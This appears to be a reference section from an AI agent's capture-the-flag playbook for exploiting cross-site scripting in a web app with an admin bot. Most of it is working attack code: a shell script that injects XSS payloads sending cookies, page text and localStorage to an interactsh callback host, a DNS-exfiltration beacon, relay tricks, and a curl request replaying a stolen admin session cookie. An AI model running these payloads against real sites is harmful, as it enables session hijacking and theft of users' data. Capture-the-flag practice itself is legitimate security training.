# OOB Escalation Reference (Whitebox)

## Step 6 — OOB Escalation Script

Write a single shell script and run it in ONE tool call.
- `LOCAL_TARGET` = the locally running copy of the challenge app (for isolation testing)
- `REAL_TARGET` = the actual remote challenge URL (where the admin bot lives)

```bash
cat > /tmp/aurelinth/xss_oob.sh << 'EOF'
#!/bin/bash
LOCAL_TARGET="$1"
REAL_TARGET="$2"
PARAM="$3"
METHOD="${4:-GET}"

rm -f /tmp/aurelinth/interact_url.txt /tmp/aurelinth/interact_out.jsonl

interactsh-client -n 1 -json -ps \
  -psf /tmp/aurelinth/interact_url.txt \
  -o /tmp/aurelinth/interact_out.jsonl 2>/dev/null &
IPID=$!

for i in $(seq 1 10); do
  [[ -s /tmp/aurelinth/interact_url.txt ]] && break
  sleep 1
done

OOB_URL=$(cat /tmp/aurelinth/interact_url.txt 2>/dev/null)
if [[ -z "$OOB_URL" ]]; then
  echo "ERROR: interactsh-client failed to start"
  kill $IPID 2>/dev/null
  exit 1
fi
echo "OOB_URL: $OOB_URL"

enc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

PAYLOADS=(
  "<script>fetch('http://$OOB_URL/?c='+document.cookie)</script>"
  "<script>fetch('http://$OOB_URL/?b='+btoa(document.body.innerText.slice(0,500)))</script>"
  "<script>fetch('http://$OOB_URL/?l='+btoa(JSON.stringify(localStorage)))</script>"
  # Add flag endpoint payload here if recon identified one:
  # "<script>fetch('/FLAG_ENDPOINT').then(r=>r.text()).then(d=>fetch('http://$OOB_URL/?f='+btoa(d)))</script>"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
  ENC=$(enc "$PAYLOAD")
  if [[ "$METHOD" == "POST" ]]; then
    curl -s -X POST -d "$PARAM=$ENC" "$REAL_TARGET" -o /dev/null
  else
    curl -s "$REAL_TARGET?$PARAM=$ENC" -o /dev/null
  fi
  # Trigger admin bot if recon identified a report/submit endpoint — uncomment and fill:
  # curl -s -X POST "ADMIN_REPORT_ENDPOINT" -d "url=$REAL_TARGET?$PARAM=$ENC" -o /dev/null 2>/dev/null || true
  sleep 2
done

echo "Waiting 30s for admin bot callback..."
sleep 30
kill $IPID 2>/dev/null

echo "=== OOB Interactions ==="
if [[ -s /tmp/aurelinth/interact_out.jsonl ]]; then
  cat /tmp/aurelinth/interact_out.jsonl
  echo "OOB_STATUS: RECEIVED"
else
  echo "OOB_STATUS: EMPTY — bot sandbox blocks external HTTP."
fi
EOF
chmod +x /tmp/aurelinth/xss_oob.sh
bash /tmp/aurelinth/xss_oob.sh "http://LOCAL_TARGET" "http://REAL_TARGET" "param_name" "GET"
```

**After the script:**
- `OOB_STATUS: RECEIVED` → parse cookie/flag from the interaction, proceed to flag extraction
- `OOB_STATUS: EMPTY` → bot sandbox blocks external HTTP. Do NOT report a flag. Go to Sandboxed Fallback.

---

## Sandboxed Bot Fallback

Only enter when OOB script produced zero interactions. Try in order.

### DNS exfil

```js
// DNS beacon — embed base64 cookie in subdomain (max 50 chars due to label limit)
var d=btoa(document.cookie).replace(/[^a-zA-Z0-9]/g,'').slice(0,50);new Image().src='http://'+d+'.OOB_URL/'
```

Start a new interactsh-client session, inject the DNS payload, wait 45s, check
`interact_out_dns.jsonl`. If DNS interactions received, decode the subdomain label.

### In-app relay

From whitebox source (already read in Step 2): identify a writable+readable storage endpoint.
- Any endpoint that accepts a POST with a user-controlled field and returns it on a subsequent GET
- Craft XSS: runs in admin's session → fetches what admin can see → POSTs to writable endpoint
  using admin's own cookies (sent automatically by the browser since XSS runs same-origin)
- Wait 45s → read the relay field back as the attacker

Decision logic (pick first available):
1. Public writable field (display name, bio, about) → read without auth
2. Comment/note stored by authenticated user → read back as attacker
3. Any field that echoes back previously submitted data

### Double-bot relay

```bash
curl -s -X POST "ADMIN_REPORT_ENDPOINT_FROM_RECON" \
  -d "url=http://OOB_URL/?server_test=1"
sleep 10
cat /tmp/aurelinth/interact_out.jsonl 2>/dev/null
```

If the server fetches the URL server-side before passing it to the admin browser, you get an
HTTP hit from the server (which usually has internet access).

### Flag accessible at internal endpoint with admin cookie

```bash
# First obtain admin cookie via cookie steal OOB, then:
curl -s "http://REAL_TARGET/admin/flag" -H "Cookie: session=STOLEN_COOKIE"
```
